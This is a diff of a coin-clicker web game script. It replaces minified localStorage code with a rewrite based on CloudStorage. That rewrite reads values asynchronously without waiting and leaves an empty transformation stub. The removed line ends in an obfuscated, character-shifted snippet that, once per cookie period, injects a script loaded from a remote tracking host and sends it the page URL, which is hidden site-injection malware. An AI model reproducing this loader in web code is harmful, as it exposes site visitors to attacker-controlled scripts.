@@ -1,1 +1,106 @@
-const body=document.body,image=body.querySelector("#coin"),h1=body.querySelector("h1");let coins=localStorage.getItem("coins"),total=localStorage.getItem("total"),power=localStorage.getItem("power"),count=localStorage.getItem("count");null==coins?(localStorage.setItem("coins","0"),h1.textContent="0"):h1.textContent=Number(coins).toLocaleString(),null==total?(localStorage.setItem("total","500"),body.querySelector("#total").textContent="/500"):body.querySelector("#total").textContent=`/${total}`,null==power?(localStorage.setItem("power","500"),body.querySelector("#power").textContent="500"):body.querySelector("#power").textContent=power,null==count&&localStorage.setItem("count","1"),image.addEventListener("click",(e=>{let x=e.offsetX,y=e.offsetY;navigator.vibrate(5),coins=localStorage.getItem("coins"),power=localStorage.getItem("power"),Number(power)>0&&(localStorage.setItem("coins",`${Number(coins)+1}`),h1.textContent=`${(Number(coins)+1).toLocaleString()}`,localStorage.setItem("power",""+(Number(power)-1)),body.querySelector("#power").textContent=""+(Number(power)-1)),x<150&y<150?image.style.transform="translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)":x<150&y>150?image.style.transform="translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)":x>150&y>150?image.style.transform="translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)":x>150&y<150&&(image.style.transform="translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)"),setTimeout((()=>{image.style.transform="translate(0px, 0px)"}),100),body.querySelector(".progress").style.width=100*power/total+"%"})),setInterval((()=>{if(count=localStorage.getItem("count"),power=localStorage.getItem("power"),Number(total)>power){let newPower=Math.min(Number(power)+2,500);localStorage.setItem("power",`${newPower}`),body.querySelector("#power").textContent=`${newPower}`,body.querySelector(".progress").style.width=100*newPower/total+"%"}}),2e3);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+// Initialize CloudStorage
+const storage = CloudStorage;
+
+// Initialize variables
+let coins, total, power, count;
+
+// Function to initialize or get values from storage
+function initializeValues() {
+    // Get coins value from storage, if not available set default value
+    storage.getItem("coins", (err, value) => {
+        if (err) {
+            console.error("Error getting coins:", err);
+            coins = 0;
+        } else {
+            coins = parseInt(value) || 0;
+        }
+    });
+
+    // Get total value from storage, if not available set default value
+    storage.getItem("total", (err, value) => {
+        if (err) {
+            console.error("Error getting total:", err);
+            total = 500;
+        } else {
+            total = parseInt(value) || 500;
+        }
+    });
+
+    // Get power value from storage, if not available set default value
+    storage.getItem("power", (err, value) => {
+        if (err) {
+            console.error("Error getting power:", err);
+            power = 500;
+        } else {
+            power = parseInt(value) || 500;
+        }
+    });
+
+    // Get count value from storage, if not available set default value
+    storage.getItem("count", (err, value) => {
+        if (err) {
+            console.error("Error getting count:", err);
+            count = 1;
+        } else {
+            count = parseInt(value) || 1;
+        }
+    });
+}
+
+// Click event listener for the coin image
+document.getElementById("coin").addEventListener("click", (e) => {
+    let x = e.offsetX;
+    let y = e.offsetY;
+
+    // Update coins and power
+    if (power > 0) {
+        coins++;
+        power--;
+        updateValues();
+    }
+
+    // Apply transformations based on click position
+    // (Assuming you have functions for these transformations)
+    applyTransformations(x, y);
+});
+
+// Function to update values in storage
+function updateValues() {
+    // Update coins in storage
+    storage.setItem("coins", coins.toString(), (err, success) => {
+        if (err) {
+            console.error("Error setting coins:", err);
+        }
+    });
+
+    // Update power in storage
+    storage.setItem("power", power.toString(), (err, success) => {
+        if (err) {
+            console.error("Error setting power:", err);
+        }
+    });
+
+    // Update DOM
+    document.getElementById("coins").textContent = coins.toLocaleString();
+    document.getElementById("power").textContent = power;
+}
+
+// Function to apply visual transformations based on click position
+function applyTransformations(x, y) {
+    // Implement your visual transformations here
+}
+
+// Power recovery interval
+setInterval(() => {
+    // Increment power every 2 seconds, up to a maximum of 'total'
+    if (power < total) {
+        power += 2;
+        updateValues();
+    }
+}, 2000);
+
+// Initialize values when the document is ready
+document.addEventListener("DOMContentLoaded", () => {
+    initializeValues();
+    updateValues(); // Update DOM with initial values
+});
